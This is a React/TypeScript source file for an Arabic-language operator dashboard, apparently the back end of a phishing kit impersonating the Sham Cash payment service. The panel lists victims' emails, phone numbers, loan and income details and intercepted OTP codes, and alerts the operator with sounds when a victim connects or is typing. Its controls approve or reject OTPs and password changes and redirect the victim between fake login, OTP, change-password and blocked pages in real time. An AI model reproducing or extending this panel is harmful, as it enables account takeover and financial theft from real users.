import { useState, useEffect, useRef } from "react";
import {
  Search, Bell, ChevronDown, Wifi, WifiOff,
  CheckCircle, XCircle, ArrowRightLeft, Clock,
  KeyRound, ShieldCheck, UserRound, Globe, Users,
  Phone, Mail, DollarSign, TrendingUp, MapPin,
  RefreshCw, PenLine, Send, X, LogOut
} from "lucide-react";

type VisitorStatus = "connected" | "typing" | "submitted" | "disconnected";
type OtpStatus = "pending" | "approved" | "rejected" | "redirected" | null;
type PassStatus = "pending" | "approved" | "rejected" | null;

interface Submission {
  id: string;
  submittedAt: string;
  submittedAtTs: number;
  email: string;
  password: string;
  phone: string;
  loan: string;
  income: string;
  otpCode: string;
  otpStatus: OtpStatus;
  changepassStatus: PassStatus;
  page: string;
  isActive: boolean;
  lastSeen: number;
}

function loadSubmissions(): Submission[] {
  try {
    return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]");
  } catch { return []; }
}

function saveSubmissions(list: Submission[]) {
  localStorage.setItem("sham_submissions", JSON.stringify(list));
}

function playConnectSound() {
  try {
    const ctx = new AudioContext();
    [659, 880, 1047].forEach((freq, i) => {
      const osc = ctx.createOscillator(); const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination); osc.type = "sine";
      osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.12);
      gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.12);
      gain.gain.linearRampToValueAtTime(0.25, ctx.currentTime + i * 0.12 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.12 + 0.3);
      osc.start(ctx.currentTime + i * 0.12); osc.stop(ctx.currentTime + i * 0.12 + 0.35);
    });
  } catch {}
}

function playDisconnectSound() {
  try {
    const ctx = new AudioContext();
    [440, 330, 220].forEach((freq, i) => {
      const osc = ctx.createOscillator(); const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination); osc.type = "sine";
      osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.14);
      gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.14);
      gain.gain.linearRampToValueAtTime(0.2, ctx.currentTime + i * 0.14 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.14 + 0.35);
      osc.start(ctx.currentTime + i * 0.14); osc.stop(ctx.currentTime + i * 0.14 + 0.4);
    });
  } catch {}
}

const T_AR = {
  title: "لوحة التحكم", visitors: "قائمة الزوار", search: "بحث (الاسم، الهاتف، البريد...)",
  all: "الكل", active: "نشطون", submitted: "مرسلون", noVisitors: "لا يوجد زوار بعد",
  noVisitorsSub: "ستظهر السجلات هنا عند إرسال أول طلب",
  selectVisitor: "اختر زائراً", selectVisitorSub: "اختر من القائمة لعرض التفاصيل",
  credentials: "بيانات الدخول", email: "البريد الإلكتروني", password: "كلمة السر",
  otpCode: "رمز OTP", phone: "رقم الهاتف", loan: "قيمة القرض", income: "الدخل الشهري",
  otpSection: "التحقق OTP", basicInfo: "المعلومات الأساسية", loanInfo: "تفاصيل الطلب",
  page: "الصفحة الحالية", submittedTime: "وقت الإرسال", lastSeen: "آخر ظهور",
  redirectTo: "توجيه الزائر", redirectLogin: "صفحة تسجيل الدخول", redirectOtp: "صفحة OTP",
  redirectChangepass: "صفحة تغيير كلمة المرور", redirectBlocked: "صفحة الحجب",
  approve: "موافقة ✓", reject: "رفض ✗", sendToOtp: "إرسال إلى OTP",
  sendToChangepass: "إرسال إلى تغيير كلمة المرور",
  statusConnected: "متصل", statusTyping: "يكتب...", statusSubmitted: "أرسل",
  statusDisconnected: "غير متصل", otpPending: "في انتظار الموافقة",
  otpApproved: "موافق عليه", otpRejected: "مرفوض", otpRedirected: "محوّل",
  passPending: "في انتظار الموافقة", passApproved: "تم التغيير", passRejected: "مرفوض",
  connectedNow: "متصل الآن", liveUser: "مستخدم حي", clearAll: "حذف الكل",
  activeVisitors: "زوار نشطون", lang: "EN", logout: "خروج",
  notSubmitted: "لم يرسل بعد", waiting: "في الانتظار...",
};

export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [selected, setSelected] = useState<string | null>(null);
  const [filter, setFilter] = useState<"all" | "active" | "submitted">("all");
  const [search, setSearch] = useState("");
  const [liveStatus, setLiveStatus] = useState<VisitorStatus>("disconnected");
  const [liveId, setLiveId] = useState<string | null>(null);
  const [showRedirect, setShowRedirect] = useState(false);
  const [hasNew, setHasNew] = useState(false);
  const prevLiveId = useRef<string | null>(null);
  const prevLiveStatus = useRef<VisitorStatus>("disconnected");

  const T = T_AR;

  useEffect(() => {
    const interval = setInterval(() => {
      const raw = loadSubmissions();
      const vId = localStorage.getItem("sham_visitor_id");
      const vStatus = localStorage.getItem("sham_visitor_status") as VisitorStatus | null;
      const vLastSeen = parseInt(localStorage.getItem("sham_visitor_heartbeat") ?? "0");
      const vDataRaw = localStorage.getItem("sham_visitor_data");
      const vPage = localStorage.getItem("sham_visitor_page") ?? "";
      const isAlive = vStatus && vStatus !== "disconnected" && (Date.now() - vLastSeen < 4000);

      const currentLiveStatus: VisitorStatus = isAlive ? (vStatus ?? "connected") : "disconnected";
      setLiveStatus(currentLiveStatus);
      setLiveId(isAlive ? vId : null);

      if (vId && isAlive) {
        if (vId !== prevLiveId.current) {
          prevLiveId.current = vId;
          playConnectSound();
          setHasNew(true);
        }
        if (prevLiveStatus.current === "disconnected" && currentLiveStatus !== "disconnected") {
          setHasNew(true);
        }
      } else if (prevLiveId.current && !isAlive) {
        if (prevLiveStatus.current !== "disconnected") {
          playDisconnectSound();
        }
        prevLiveId.current = null;
      }
      prevLiveStatus.current = currentLiveStatus;

      const otpStatus = localStorage.getItem("sham_otp_status") as OtpStatus;
      const otpCode = localStorage.getItem("sham_otp_code") ?? "";
      const changepassStatus = localStorage.getItem("sham_changepass_status") as PassStatus;
      const vData = vDataRaw ? JSON.parse(vDataRaw) : {};

      const updated = raw.map((s) => {
        if (s.id === vId) {
          return {
            ...s,
            isActive: !!isAlive,
            lastSeen: vLastSeen || s.lastSeen,
            page: vPage || s.page,
            email: vData.email || s.email,
            phone: vData.phone || s.phone,
            loan: vData.loan || s.loan,
            income: vData.income || s.income,
            otpCode: otpCode || s.otpCode,
            otpStatus: otpStatus ?? s.otpStatus,
            changepassStatus: changepassStatus ?? s.changepassStatus,
          };
        }
        return { ...s, isActive: false };
      });

      if (vId && isAlive) {
        const exists = updated.find((s) => s.id === vId);
        if (!exists) {
          const newSub: Submission = {
            id: vId,
            submittedAt: localStorage.getItem("sham_visitor_connected_at") ?? new Date().toLocaleTimeString("ar-SY"),
            submittedAtTs: Date.now(),
            email: vData.email ?? "",
            password: "",
            phone: vData.phone ?? localStorage.getItem("sham_phone") ?? "",
            loan: vData.loan ?? "",
            income: vData.income ?? "",
            otpCode: otpCode,
            otpStatus: otpStatus,
            changepassStatus: changepassStatus,
            page: vPage,
            isActive: true,
            lastSeen: vLastSeen,
          };
          const next = [newSub, ...updated];
          saveSubmissions(next);
          setSubmissions(next);
          setHasNew(true);
          return;
        }
      }

      saveSubmissions(updated);
      setSubmissions(updated);
    }, 600);
    return () => clearInterval(interval);
  }, []);

  function sendCmd(cmd: string) {
    localStorage.setItem("sham_admin_cmd", cmd);
  }

  function decideOtp(decision: OtpStatus) {
    localStorage.setItem("sham_otp_status", decision ?? "");
    setSubmissions((prev) => prev.map((s) => s.isActive ? { ...s, otpStatus: decision } : s));
  }

  function decidePass(decision: PassStatus) {
    localStorage.setItem("sham_changepass_status", decision ?? "");
    setSubmissions((prev) => prev.map((s) => s.isActive ? { ...s, changepassStatus: decision } : s));
  }

  function clearAll() {
    saveSubmissions([]);
    setSubmissions([]);
    setSelected(null);
  }

  const filtered = submissions.filter((s) => {
    const q = search.toLowerCase();
    const matchSearch = !q || s.email.toLowerCase().includes(q) || s.phone.includes(q) || s.id.includes(q);
    const matchFilter = filter === "all" || (filter === "active" && s.isActive) || (filter === "submitted" && (s.otpCode || s.otpStatus || s.changepassStatus));
    return matchSearch && matchFilter;
  });

  const selectedSub = submissions.find((s) => s.id === selected) ?? null;
  const activeCount = submissions.filter((s) => s.isActive).length;

  const pageColor: Record<string, string> = {
    "تسجيل الدخول": "bg-[#657bd8]/20 text-[#657bd8]",
    "التحقق OTP": "bg-[#f5a623]/20 text-[#f5a623]",
    "تغيير كلمة المرور": "bg-[#1fc28a]/20 text-[#1fc28a]",
  };
  const statusColor: Record<string, string> = {
    connected: "text-[#1fc28a]", typing: "text-[#f5a623]",
    submitted: "text-[#657bd8]", disconnected: "text-white/30",
  };
  const statusDot: Record<string, string> = {
    connected: "bg-[#1fc28a]", typing: "bg-[#f5a623]",
    submitted: "bg-[#657bd8]", disconnected: "bg-white/20",
  };

  return (
    <div className="flex h-screen w-full overflow-hidden bg-[#0b1120] text-white" dir="rtl" style={{ fontFamily: "'Inter', system-ui, sans-serif" }}>

      {/* RIGHT PANEL — VISITORS LIST */}
      <div className={`flex h-full w-full flex-col border-l border-[#1e2a45] bg-[#0d1526] ${selectedSub ? "hidden sm:flex sm:w-[340px]" : "flex"} sm:flex sm:w-[340px] flex-shrink-0`}>

        {/* Header */}
        <div className="flex items-center justify-between px-4 pt-4 pb-3 border-b border-[#1e2a45]">
          <div className="flex items-center gap-2">
            <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-[#657bd8]/15">
              <Users className="h-4 w-4 text-[#657bd8]" />
            </div>
            <div>
              <p className="text-[13px] font-extrabold text-white/90">{T.visitors}</p>
              <p className="text-[10px] text-[#c9ccdb]/40">{submissions.length} سجل</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            {hasNew && (
              <div className="h-2 w-2 rounded-full bg-[#e54343] animate-pulse ring-2 ring-[#0d1526]" />
            )}
            {onLogout && (
              <button onClick={onLogout} className="rounded-[6px] bg-white/5 p-1.5 text-white/40 hover:bg-red-500/20 hover:text-red-400 transition-colors">
                <LogOut className="h-3.5 w-3.5" />
              </button>
            )}
          </div>
        </div>

        {/* Live indicator */}
        {liveStatus !== "disconnected" && (
          <div className="mx-3 mt-3 flex items-center gap-2 rounded-[10px] bg-[#1fc28a]/10 border border-[#1fc28a]/20 px-3 py-2">
            <span className="h-2 w-2 rounded-full bg-[#1fc28a] animate-pulse" />
            <span className="text-[11px] font-bold text-[#1fc28a]">{T.liveUser}</span>
            <span className={`mr-auto text-[10px] font-semibold ${statusColor[liveStatus]}`}>
              {liveStatus === "typing" ? T.statusTyping : liveStatus === "submitted" ? T.statusSubmitted : T.statusConnected}
            </span>
          </div>
        )}

        {/* Search */}
        <div className="px-3 pt-3 pb-2">
          <div className="flex items-center gap-2 rounded-[10px] bg-[#1a2540] border border-[#1e2a45] px-3 py-2">
            <Search className="h-3.5 w-3.5 text-white/30 shrink-0" />
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder={T.search}
              className="flex-1 bg-transparent text-[12px] text-white/80 outline-none placeholder:text-white/25"
              dir="rtl"
            />
          </div>
        </div>

        {/* Filters */}
        <div className="flex gap-1.5 px-3 pb-3">
          {(["all", "active", "submitted"] as const).map((f) => (
            <button key={f} onClick={() => setFilter(f)}
              className={`rounded-[7px] px-3 py-1.5 text-[11px] font-bold transition-colors ${filter === f ? "bg-[#657bd8] text-white" : "bg-[#1a2540] text-white/40 hover:bg-[#1e2a55]"}`}>
              {f === "all" ? T.all : f === "active" ? T.active : T.submitted}
            </button>
          ))}
          {submissions.length > 0 && (
            <button onClick={clearAll} className="mr-auto rounded-[7px] px-2 py-1.5 text-[10px] font-bold text-white/30 hover:text-red-400 transition-colors">
              {T.clearAll}
            </button>
          )}
        </div>

        {/* List */}
        <div className="flex-1 overflow-y-auto px-3 pb-4 space-y-2">
          {filtered.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-12 text-center space-y-3">
              <div className="h-12 w-12 rounded-full bg-[#1a2540] flex items-center justify-center">
                <Bell className="h-5 w-5 text-white/20" />
              </div>
              <p className="text-[12px] font-bold text-white/25">{T.noVisitors}</p>
              <p className="text-[10px] text-white/15">{T.noVisitorsSub}</p>
            </div>
          ) : (
            filtered.map((sub) => {
              const isSelected = selected === sub.id;
              const displayPhone = sub.phone || sub.email || sub.id.slice(-8);
              const timeDiff = Date.now() - sub.submittedAtTs;
              const timeAgo = timeDiff < 60000 ? "الآن" : timeDiff < 3600000 ? `${Math.floor(timeDiff / 60000)} د` : `${Math.floor(timeDiff / 3600000)} س`;
              return (
                <button key={sub.id} onClick={() => { setSelected(sub.id); setHasNew(false); }}
                  className={`w-full rounded-[12px] border p-3 text-right transition-all duration-150 ${isSelected
                    ? "bg-[#1a2a55] border-[#657bd8]/50 shadow-[0_0_12px_rgba(101,123,216,0.15)]"
                    : "bg-[#121d35] border-[#1e2a45] hover:bg-[#162038] hover:border-[#2a3a5a]"
                    }`}
                  dir={"rtl"}
                >
                  <div className="flex items-start justify-between gap-2">
                    <div className="flex items-center gap-2 min-w-0">
                      <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-full text-[13px] font-extrabold
                        ${sub.isActive ? "bg-[#1fc28a]/15 text-[#1fc28a]" : "bg-[#657bd8]/10 text-[#657bd8]/60"}`}>
                        {displayPhone.slice(0, 1).toUpperCase() || "؟"}
                      </div>
                      <div className="min-w-0">
                        <p className="truncate text-[12px] font-bold text-white/85">{displayPhone}</p>
                        {sub.email && sub.phone && (
                          <p className="truncate text-[10px] text-white/35" dir="ltr">{sub.email}</p>
                        )}
                      </div>
                    </div>
                    <div className="flex flex-col items-end gap-1 shrink-0">
                      <span className="text-[9px] text-white/30 flex items-center gap-1">
                        <Clock className="h-2.5 w-2.5" />{timeAgo}
                      </span>
                      {sub.isActive && (
                        <span className="flex items-center gap-1 rounded-full bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">
                          <span className="h-1.5 w-1.5 rounded-full bg-[#1fc28a] animate-pulse" />
                          {T.connectedNow}
                        </span>
                      )}
                    </div>
                  </div>
                  <div className="mt-2 flex flex-wrap items-center gap-1.5">
                    {sub.page && (
                      <span className={`rounded-[5px] px-1.5 py-0.5 text-[9px] font-bold ${pageColor[sub.page] ?? "bg-white/5 text-white/40"}`}>
                        {sub.page}
                      </span>
                    )}
                    {sub.otpCode && (
                      <span className="rounded-[5px] bg-[#f5a623]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#f5a623]">
                        OTP: {sub.otpCode}
                      </span>
                    )}
                    {sub.otpStatus === "approved" && (
                      <span className="rounded-[5px] bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">✓ {T.otpApproved}</span>
                    )}
                    {sub.otpStatus === "rejected" && (
                      <span className="rounded-[5px] bg-[#e54343]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#e54343]">✗ {T.otpRejected}</span>
                    )}
                    {sub.changepassStatus === "approved" && (
                      <span className="rounded-[5px] bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">✓ {T.passApproved}</span>
                    )}
                  </div>
                </button>
              );
            })
          )}
        </div>
      </div>

      {/* LEFT PANEL — DETAILS */}
      <div className={`flex-1 flex-col h-full overflow-y-auto ${selectedSub ? "flex" : "hidden sm:flex"}`}>
        {!selectedSub ? (
          <div className="flex h-full flex-col items-center justify-center text-center space-y-4">
            <div className="h-16 w-16 rounded-full bg-[#1a2540] flex items-center justify-center">
              <UserRound className="h-7 w-7 text-white/15" />
            </div>
            <p className="text-[14px] font-bold text-white/25">{T.selectVisitor}</p>
            <p className="text-[12px] text-white/15">{T.selectVisitorSub}</p>
          </div>
        ) : (
          <div className="h-full overflow-y-auto">

            {/* Details Header */}
            <div className="sticky top-0 z-10 border-b border-[#1e2a45] bg-[#0b1120]/95 backdrop-blur-sm px-5 pt-4 pb-3">
              <div className="flex items-center justify-between gap-3">
                <div className="flex items-center gap-3 min-w-0">
                  <button onClick={() => setSelected(null)} className="sm:hidden rounded-[8px] bg-white/5 p-2 text-white/50 hover:bg-white/10">
                    <X className="h-4 w-4" />
                  </button>
                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-[16px] font-extrabold
                    ${selectedSub.isActive ? "bg-[#1fc28a]/20 text-[#1fc28a]" : "bg-[#657bd8]/15 text-[#657bd8]/70"}`}>
                    {(selectedSub.phone || selectedSub.email || "؟").slice(0, 1).toUpperCase()}
                  </div>
                  <div className="min-w-0">
                    <p className="text-[14px] font-extrabold text-white/90 truncate">
                      {selectedSub.phone || selectedSub.email || selectedSub.id.slice(-10)}
                    </p>
                    <div className="flex items-center gap-1.5">
                      <span className={`h-1.5 w-1.5 rounded-full ${selectedSub.isActive ? statusDot[liveStatus] : "bg-white/20"}`} />
                      <span className={`text-[10px] font-semibold ${selectedSub.isActive ? statusColor[liveStatus] : "text-white/30"}`}>
                        {selectedSub.isActive
                          ? (liveStatus === "typing" ? T.statusTyping : liveStatus === "submitted" ? T.statusSubmitted : T.statusConnected)
                          : T.statusDisconnected}
                      </span>
                      {selectedSub.page && (
                        <span className={`rounded-full px-1.5 py-0.5 text-[9px] font-bold ${pageColor[selectedSub.page] ?? "bg-white/5 text-white/40"}`}>
                          {selectedSub.page}
                        </span>
                      )}
                    </div>
                  </div>
                </div>

                {/* Redirect dropdown */}
                <div className="relative shrink-0">
                  <button onClick={() => setShowRedirect(!showRedirect)}
                    className="flex items-center gap-1.5 rounded-[9px] bg-[#657bd8]/15 border border-[#657bd8]/30 px-3 py-2 text-[11px] font-bold text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors">
                    <ArrowRightLeft className="h-3.5 w-3.5" />
                    {T.redirectTo}
                    <ChevronDown className="h-3 w-3" />
                  </button>
                  {showRedirect && (
                    <div className={`absolute top-full mt-1 z-50 rounded-[12px] bg-[#131e35] border border-[#1e2a45] shadow-2xl overflow-hidden min-w-[180px] ${"left-0"}`}>
                      {[
                        { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3.5 w-3.5" />, color: "text-white/70" },
                        { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3.5 w-3.5" />, color: "text-[#657bd8]" },
                        { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3.5 w-3.5" />, color: "text-[#1fc28a]" },
                        { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3.5 w-3.5" />, color: "text-[#e54343]" },
                      ].map((opt) => (
                        <button key={opt.cmd} onClick={() => { sendCmd(opt.cmd); setShowRedirect(false); }}
                          className={`flex w-full items-center gap-2.5 px-4 py-3 text-[12px] font-semibold ${opt.color} hover:bg-white/5 transition-colors`}
                          dir={"rtl"}>
                          {opt.icon}{opt.label}
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* Quick info row */}
              <div className="mt-3 flex flex-wrap items-center gap-2">
                {selectedSub.submittedAt && (
                  <span className="flex items-center gap-1 text-[10px] text-white/35">
                    <Clock className="h-3 w-3" /> {selectedSub.submittedAt}
                  </span>
                )}
                <span className="flex items-center gap-1 text-[10px] text-white/20">
                  ID: {selectedSub.id.slice(-8)}
                </span>
              </div>
            </div>

            <div className="space-y-3 p-5" onClick={() => setShowRedirect(false)}>

              {/* OTP SECTION */}
              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
                <div className="flex items-center justify-between border-b border-[#1e2a45] px-4 py-2.5">
                  <div className="flex items-center gap-2">
                    <ShieldCheck className="h-4 w-4 text-[#657bd8]" />
                    <span className="text-[12px] font-extrabold text-[#657bd8]">{T.otpSection}</span>
                  </div>
                  {selectedSub.otpStatus && (
                    <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold
                      ${selectedSub.otpStatus === "approved" ? "bg-[#1fc28a]/15 text-[#1fc28a]"
                        : selectedSub.otpStatus === "rejected" ? "bg-[#e54343]/15 text-[#e54343]"
                        : selectedSub.otpStatus === "redirected" ? "bg-[#657bd8]/15 text-[#657bd8]"
                        : "bg-[#f5a623]/15 text-[#f5a623]"}`}>
                      {selectedSub.otpStatus === "approved" ? T.otpApproved
                        : selectedSub.otpStatus === "rejected" ? T.otpRejected
                        : selectedSub.otpStatus === "redirected" ? T.otpRedirected
                        : T.otpPending}
                    </span>
                  )}
                </div>
                <div className="p-4 space-y-3">
                  {/* Credentials */}
                  <div className="grid grid-cols-1 gap-2">
                    {[
                      { label: T.email, value: selectedSub.email, icon: <Mail className="h-3 w-3" />, dir: "ltr" },
                      { label: T.password, value: selectedSub.password ? "••••••••" : T.notSubmitted, icon: <KeyRound className="h-3 w-3" />, dir: "ltr" },
                      { label: T.otpCode, value: selectedSub.otpCode || T.waiting, icon: <ShieldCheck className="h-3 w-3" />, dir: "ltr", highlight: !!selectedSub.otpCode },
                    ].map((row) => (
                      <div key={row.label} className={`flex items-center justify-between rounded-[9px] px-3 py-2.5 ${row.highlight ? "bg-[#f5a623]/10 border border-[#f5a623]/20" : "bg-[#0d1526] border border-[#1e2a45]"}`}>
                        <span className={`text-[10px] font-semibold flex items-center gap-1.5 ${row.highlight ? "text-[#f5a623]/70" : "text-white/35"}`}>
                          {row.icon}{row.label}
                        </span>
                        <span className={`text-[12px] font-bold ${row.highlight ? "text-[#f5a623]" : row.value === T.waiting || row.value === T.notSubmitted ? "text-white/25" : "text-white/80"}`} dir={row.dir}>
                          {row.value || "—"}
                        </span>
                      </div>
                    ))}
                  </div>

                  {/* OTP Action Buttons */}
                  {selectedSub.isActive && (
                    <div className="space-y-2 pt-1">
                      <p className="text-[9px] font-bold text-white/25 uppercase tracking-widest">أوامر OTP</p>
                      <div className="grid grid-cols-2 gap-2">
                        <button onClick={() => decideOtp("approved")}
                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[11px] font-bold">
                          <CheckCircle className="h-3.5 w-3.5" />{T.approve}
                        </button>
                        <button onClick={() => decideOtp("rejected")}
                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[11px] font-bold">
                          <XCircle className="h-3.5 w-3.5" />{T.reject}
                        </button>
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <button onClick={() => sendCmd("redirect:otp")}
                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#657bd8]/15 border border-[#657bd8]/20 py-2 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95 text-[10px] font-bold">
                          <Send className="h-3 w-3" />{T.sendToOtp}
                        </button>
                        <button onClick={() => sendCmd("redirect:changepass")}
                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/10 border border-[#1fc28a]/15 py-2 text-[#1fc28a]/70 hover:bg-[#1fc28a]/20 transition-colors active:scale-95 text-[10px] font-bold">
                          <RefreshCw className="h-3 w-3" />{T.sendToChangepass}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* BASIC INFO */}
              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
                <div className="flex items-center gap-2 border-b border-[#1e2a45] px-4 py-2.5">
                  <UserRound className="h-4 w-4 text-white/40" />
                  <span className="text-[12px] font-extrabold text-white/60">{T.basicInfo}</span>
                </div>
                <div className="p-4 space-y-2">
                  {[
                    { label: T.phone, value: selectedSub.phone, icon: <Phone className="h-3 w-3" />, dir: "ltr" },
                    { label: T.submittedTime, value: selectedSub.submittedAt, icon: <Clock className="h-3 w-3" />, dir: "ltr" },
                    { label: T.page, value: selectedSub.page, icon: <MapPin className="h-3 w-3" />, dir: "rtl" },
                  ].map((row) => (
                    <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
                      <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
                      <span className={`text-[12px] font-bold ${row.value ? "text-white/80" : "text-white/20"}`} dir={row.dir}>{row.value || "—"}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* LOAN DETAILS */}
              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
                <div className="flex items-center gap-2 border-b border-[#1e2a45] px-4 py-2.5">
                  <DollarSign className="h-4 w-4 text-[#1fc28a]/60" />
                  <span className="text-[12px] font-extrabold text-[#1fc28a]/60">{T.loanInfo}</span>
                </div>
                <div className="p-4 space-y-2">
                  {[
                    { label: T.loan, value: selectedSub.loan ? `${selectedSub.loan} ل.س` : "", icon: <DollarSign className="h-3 w-3" /> },
                    { label: T.income, value: selectedSub.income ? `${selectedSub.income} ل.س` : "", icon: <TrendingUp className="h-3 w-3" /> },
                  ].map((row) => (
                    <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
                      <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
                      <span className={`text-[12px] font-bold ${row.value ? "text-[#1fc28a]" : "text-white/20"}`} dir="ltr">{row.value || "—"}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* CHANGE PASSWORD */}
              {(selectedSub.changepassStatus || selectedSub.isActive) && (
                <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
                  <div className="flex items-center justify-between border-b border-[#1e2a45] px-4 py-2.5">
                    <div className="flex items-center gap-2">
                      <KeyRound className="h-4 w-4 text-[#1fc28a]/60" />
                      <span className="text-[12px] font-extrabold text-[#1fc28a]/60">تغيير كلمة المرور</span>
                    </div>
                    {selectedSub.changepassStatus && (
                      <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold
                        ${selectedSub.changepassStatus === "approved" ? "bg-[#1fc28a]/15 text-[#1fc28a]"
                          : selectedSub.changepassStatus === "rejected" ? "bg-[#e54343]/15 text-[#e54343]"
                          : "bg-[#f5a623]/15 text-[#f5a623]"}`}>
                        {selectedSub.changepassStatus === "approved" ? T.passApproved
                          : selectedSub.changepassStatus === "rejected" ? T.passRejected
                          : T.passPending}
                      </span>
                    )}
                  </div>
                  {selectedSub.isActive && (
                    <div className="p-4">
                      <div className="grid grid-cols-2 gap-2">
                        <button onClick={() => decidePass("approved")}
                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[11px] font-bold">
                          <CheckCircle className="h-3.5 w-3.5" />{T.approve}
                        </button>
                        <button onClick={() => decidePass("rejected")}
                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[11px] font-bold">
                          <XCircle className="h-3.5 w-3.5" />{T.reject}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* REDIRECT ACTIONS */}
              {selectedSub.isActive && (
                <div className="rounded-[14px] border border-[#657bd8]/20 bg-[#657bd8]/5 p-4 space-y-2">
                  <p className="text-[10px] font-bold text-[#657bd8]/60 uppercase tracking-widest flex items-center gap-1.5">
                    <ArrowRightLeft className="h-3 w-3" />{T.redirectTo}
                  </p>
                  <div className="grid grid-cols-2 gap-2">
                    {[
                      { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3 w-3" />, color: "text-white/60 border-white/10 bg-white/5 hover:bg-white/10" },
                      { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3 w-3" />, color: "text-[#657bd8] border-[#657bd8]/20 bg-[#657bd8]/10 hover:bg-[#657bd8]/20" },
                      { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3 w-3" />, color: "text-[#1fc28a] border-[#1fc28a]/20 bg-[#1fc28a]/10 hover:bg-[#1fc28a]/20" },
                      { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3 w-3" />, color: "text-[#e54343] border-[#e54343]/20 bg-[#e54343]/10 hover:bg-[#e54343]/20" },
                    ].map((opt) => (
                      <button key={opt.cmd} onClick={() => sendCmd(opt.cmd)}
                        className={`flex items-center justify-center gap-1.5 rounded-[9px] border py-2.5 transition-colors active:scale-95 text-[10px] font-bold ${opt.color}`}>
                        {opt.icon}
                        <span className="truncate">{opt.label}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default ShamCashAdmin;
